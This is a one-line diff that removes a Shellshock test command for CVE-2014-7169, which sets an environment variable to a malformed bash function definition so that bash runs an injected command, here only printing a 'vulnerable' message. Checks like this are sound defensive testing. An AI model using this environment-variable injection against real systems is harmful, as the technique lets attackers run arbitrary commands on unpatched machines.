@@ -1,1 +1,0 @@
-X='() { (a)=>\' bash -c "/dev/stdout echo vulnerable to CVE-2014-7169" 2>/dev/null
